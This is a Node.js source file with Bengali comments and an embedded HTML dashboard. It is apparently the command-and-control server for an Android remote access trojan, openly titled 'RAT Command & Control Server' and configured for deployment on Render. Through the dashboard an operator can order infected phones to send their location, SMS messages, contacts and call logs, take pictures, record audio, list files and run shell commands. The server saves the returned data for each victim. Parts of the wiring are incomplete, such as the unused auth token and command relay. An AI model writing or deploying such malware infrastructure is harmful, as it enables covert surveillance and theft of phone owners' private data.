// server.js - Render-এর জন্য আপডেটেড WebSocket C2 সার্ভার
const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Render স্বয়ংক্রিয়ভাবে PORT পরিবেশ ভেরিয়েবল সেট করে দেয় [citation:6]
const port = process.env.PORT || 10000; // Render সাধারণত 10000 পোর্ট ব্যবহার করে

// কনফিগারেশন
const config = {
  authToken: 'your-secret-auth-token', // পরিবর্তন করুন!
  dataDir: './client_data'
};

// ডাটা ডিরেক্টরি তৈরি করুন
if (!fs.existsSync(config.dataDir)) {
  fs.mkdirSync(config.dataDir, { recursive: true });
}

// Store connected clients
const clients = new Map(); // Map<socket, clientInfo>
const commandCallbacks = new Map(); // Map<commandId, callback>

// HTTP সার্ভার তৈরি করুন
const server = http.createServer((req, res) => {
  // হেলথ চেক এন্ডপয়েন্ট - Render-এর জন্য প্রয়োজনীয় [citation:2]
  if (req.url === '/healthz' || req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ 
      status: 'ok', 
      message: 'C2 Server is running',
      timestamp: new Date().toISOString(),
      clients: clients.size
    }));
    return;
  }
  
  // ড্যাশবোর্ডের জন্য
  if (req.url === '/dashboard') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(getDashboardHTML());
    return;
  }
  
  // ফাইল সার্ভ করার জন্য
  if (req.url.startsWith('/files/')) {
    const filePath = path.join(config.dataDir, path.basename(req.url));
    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404);
        res.end('File not found');
      } else {
        res.writeHead(200);
        res.end(data);
      }
    });
    return;
  }
  
  res.writeHead(404);
  res.end('Not found');
});

// WebSocket সার্ভার তৈরি করুন [citation:6]
const wss = new WebSocket.Server({ server });

// হেলথ চেক এন্ডপয়েন্টের জন্য WebSocket পাথ
wss.shouldHandle = (request) => {
  // হেলথ চেক রিকোয়েস্ট WebSocket হ্যান্ডেল করবে না
  return request.url !== '/healthz' && request.url !== '/';
};

// হেলথ চেক ইন্টারভাল (কানেকশন লাইভ রাখার জন্য)
const heartbeatInterval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) {
      clients.delete(ws);
      return ws.terminate();
    }
    
    ws.isAlive = false;
    ws.ping();
  });
}, 30000); // প্রতি ৩০ সেকেন্ডে পিং [citation:6]

wss.on('close', () => {
  clearInterval(heartbeatInterval);
});

// WebSocket কানেকশন হ্যান্ডেল করুন
wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  
  ws.on('pong', () => {
    ws.isAlive = true;
  });
  
  const clientIp = req.socket.remoteAddress;
  const clientId = generateClientId();
  
  console.log(`[${new Date().toISOString()}] New client connected: ${clientId} from ${clientIp}`);
  
  // স্টোর ক্লায়েন্ট ইনফরমেশন
  clients.set(ws, {
    id: clientId,
    ip: clientIp,
    connectedAt: new Date(),
    lastSeen: new Date(),
    deviceInfo: null,
    online: true,
    ws: ws
  });
  
  // কানেকশন অ্যাক্সেপ্ট কনফার্মেশন পাঠান
  ws.send(JSON.stringify({
    type: 'connected',
    clientId: clientId,
    message: 'Connected to C2 server',
    commands: ['GET_LOCATION', 'GET_SMS', 'GET_CONTACTS', 'GET_CALL_LOGS', 
               'TAKE_PICTURE', 'RECORD_AUDIO', 'GET_FILES', 'VIBRATE', 'SHELL_COMMAND']
  }));
  
  // মেসেজ হ্যান্ডেল করুন
  ws.on('message', (data) => {
    try {
      const message = JSON.parse(data.toString());
      handleClientMessage(ws, clientId, message);
    } catch (error) {
      console.error(`[${clientId}] Error parsing message:`, error);
    }
  });
  
  // ডিসকানেক্ট হ্যান্ডেল করুন
  ws.on('close', () => {
    console.log(`[${new Date().toISOString()}] Client disconnected: ${clientId}`);
    clients.delete(ws);
  });
  
  ws.on('error', (error) => {
    console.error(`[${clientId}] WebSocket error:`, error);
  });
});

// ক্লায়েন্ট মেসেজ হ্যান্ডলার
function handleClientMessage(ws, clientId, message) {
  const client = clients.get(ws);
  if (!client) return;
  
  client.lastSeen = new Date();
  
  switch (message.type) {
    case 'device_info':
      client.deviceInfo = message.data;
      console.log(`Client ${clientId} connected:`, message.data);
      break;
      
    case 'response':
      if (message.command_id && commandCallbacks.has(message.command_id)) {
        const callback = commandCallbacks.get(message.command_id);
        callback(message);
        commandCallbacks.delete(message.command_id);
      }
      
      if (message.data) {
        saveClientData(clientId, message, message.data);
      }
      break;
      
    case 'heartbeat':
      ws.send(JSON.stringify({ type: 'heartbeat_ack' }));
      break;
      
    default:
      console.log(`[${clientId}] Unknown message type:`, message.type);
  }
}

// ডাটা সেভ করা
function saveClientData(clientId, message, data) {
  const clientDir = path.join(config.dataDir, clientId);
  if (!fs.existsSync(clientDir)) {
    fs.mkdirSync(clientDir, { recursive: true });
  }
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = path.join(clientDir, `${message.type}_${timestamp}.json`);
  
  fs.writeFileSync(filename, JSON.stringify({
    timestamp: new Date().toISOString(),
    command_id: message.command_id,
    data: data
  }, null, 2));
}

// ইউনিক আইডি জেনারেটর
function generateClientId() {
  return 'client_' + crypto.randomBytes(8).toString('hex');
}

// কমান্ড পাঠানোর ফাংশন
function sendCommandToClient(ws, command) {
  return new Promise((resolve, reject) => {
    const commandId = 'cmd_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
    const fullCommand = {
      type: command.type,
      commandId: commandId,
      data: command.params || {}
    };
    
    commandCallbacks.set(commandId, resolve);
    
    setTimeout(() => {
      if (commandCallbacks.has(commandId)) {
        commandCallbacks.delete(commandId);
        reject(new Error('Command timeout'));
      }
    }, 30000);
    
    ws.send(JSON.stringify(fullCommand));
  });
}

// ড্যাশবোর্ড HTML
function getDashboardHTML() {
  return `
  <!DOCTYPE html>
  <html>
  <head>
    <title>RAT C2 Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
      .container { max-width: 1200px; margin: 0 auto; }
      .header { background: #333; color: white; padding: 20px; border-radius: 5px; }
      .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 20px 0; }
      .stat-card { background: white; padding: 15px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
      .clients { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
      .client-card { background: white; border-radius: 5px; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
      .client-card.online { border-left: 4px solid #4CAF50; }
      .client-id { font-weight: bold; font-size: 1.1em; }
      .client-info { margin: 10px 0; font-size: 0.9em; color: #666; }
      .command-form { margin-top: 10px; }
      select, input, button { padding: 8px; margin: 2px; width: 100%; box-sizing: border-box; }
      button { background: #4CAF50; color: white; border: none; cursor: pointer; border-radius: 3px; }
      button:hover { background: #45a049; }
      .logs { background: #1e1e1e; color: #00ff00; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll; margin-top: 20px; }
      .server-url { background: #e8f5e9; padding: 10px; border-radius: 5px; margin: 10px 0; word-break: break-all; }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <h1>RAT Command & Control Server</h1>
        <p>Server URL: <span id="serverUrl"></span></p>
      </div>
      
      <div class="stats">
        <div class="stat-card">
          <h3>Total Clients</h3>
          <h2 id="totalClients">0</h2>
        </div>
        <div class="stat-card">
          <h3>Online Clients</h3>
          <h2 id="onlineClients">0</h2>
        </div>
        <div class="stat-card">
          <h3>Commands Sent</h3>
          <h2 id="commandsSent">0</h2>
        </div>
      </div>
      
      <div class="server-url" id="serverUrlDisplay">
        Loading...
      </div>
      
      <div class="clients" id="clients"></div>
      
      <div class="logs" id="logs">
        [Server Started] Waiting for connections...
      </div>
    </div>
    
    <script>
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const wsUrl = protocol + '//' + window.location.host;
      const ws = new WebSocket(wsUrl);
      
      document.getElementById('serverUrl').textContent = wsUrl;
      document.getElementById('serverUrlDisplay').innerHTML = '<strong>WebSocket URL for App:</strong> ' + wsUrl;
      
      let commandsSent = 0;
      
      ws.onopen = () => {
        addLog('Connected to server');
      };
      
      ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        
        if (data.type === 'connected') {
          addLog('Server connected - Client ID: ' + data.clientId);
        } else if (data.type === 'clients_update') {
          updateClients(data.clients);
        } else if (data.type === 'response') {
          handleCommandResponse(data);
        }
      };
      
      function updateClients(clients) {
        const onlineClients = clients.filter(c => c.online).length;
        document.getElementById('totalClients').textContent = clients.length;
        document.getElementById('onlineClients').textContent = onlineClients;
        
        const clientsDiv = document.getElementById('clients');
        clientsDiv.innerHTML = clients.map(client => createClientCard(client)).join('');
      }
      
      function createClientCard(client) {
        return \`
          <div class="client-card \${client.online ? 'online' : 'offline'}">
            <div class="client-id">\${client.id}</div>
            <div class="client-info">
              <div>Model: \${client.deviceInfo?.model || 'Unknown'}</div>
              <div>Android: \${client.deviceInfo?.androidVersion || 'Unknown'}</div>
              <div>IP: \${client.ip || 'Unknown'}</div>
              <div>Last Seen: \${new Date(client.lastSeen).toLocaleString()}</div>
              <div>Battery: \${client.deviceInfo?.batteryLevel || '?'}%</div>
            </div>
            <div class="command-form">
              <select id="cmd-\${client.id}">
                <option value="GET_LOCATION">Get Location</option>
                <option value="GET_SMS">Get SMS</option>
                <option value="GET_CONTACTS">Get Contacts</option>
                <option value="GET_CALL_LOGS">Get Call Logs</option>
                <option value="TAKE_PICTURE">Take Picture</option>
                <option value="RECORD_AUDIO">Record Audio</option>
                <option value="GET_FILES">List Files</option>
                <option value="VIBRATE">Vibrate</option>
              </select>
              <input type="text" id="param-\${client.id}" placeholder="Parameters">
              <button onclick="sendCommand('\${client.id}')">Send Command</button>
            </div>
          </div>
        \`;
      }
      
      function sendCommand(clientId) {
        const cmdSelect = document.getElementById('cmd-' + clientId);
        const paramInput = document.getElementById('param-' + clientId);
        
        ws.send(JSON.stringify({
          type: 'command',
          clientId: clientId,
          command: cmdSelect.value,
          params: paramInput.value
        }));
        
        commandsSent++;
        document.getElementById('commandsSent').textContent = commandsSent;
        addLog('Sent command to ' + clientId + ': ' + cmdSelect.value);
      }
      
      function handleCommandResponse(response) {
        addLog('Response from ' + response.clientId + ': ' + JSON.stringify(response.data));
      }
      
      function addLog(message) {
        const logsDiv = document.getElementById('logs');
        const logEntry = '[' + new Date().toLocaleTimeString() + '] ' + message + '\\n';
        logsDiv.innerHTML += logEntry;
        logsDiv.scrollTop = logsDiv.scrollHeight;
      }
    </script>
  </body>
  </html>
  `;
}

// সার্ভার চালু করুন
server.listen(port, () => {
  console.log(`
╔══════════════════════════════════════════════════════════╗
║     RAT Command & Control Server                         ║
╠══════════════════════════════════════════════════════════╣
║  Dashboard: http://localhost:${port}                       ║
║  WebSocket: ws://localhost:${port}                         ║
║  Health Check: http://localhost:${port}/healthz            ║
║  Ready for Render deployment!                             ║
╚══════════════════════════════════════════════════════════╝
  `);
});
